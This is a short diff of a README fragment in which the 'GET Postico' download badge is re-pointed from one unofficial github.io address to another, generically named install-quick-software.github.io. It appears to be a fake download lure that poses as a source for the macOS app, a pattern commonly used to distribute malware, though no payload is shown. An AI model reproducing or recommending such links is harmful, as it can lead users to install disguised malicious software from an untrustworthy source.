@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/postico">  
+<a href="https://install-quick-software.github.io/.github/postico">  
 <img src="https://img.shields.io/badge/💻_GET_Postico-blue?style=for-the-badge&logo=apple" alt="GET Postico">  
 </a>  
 </div>
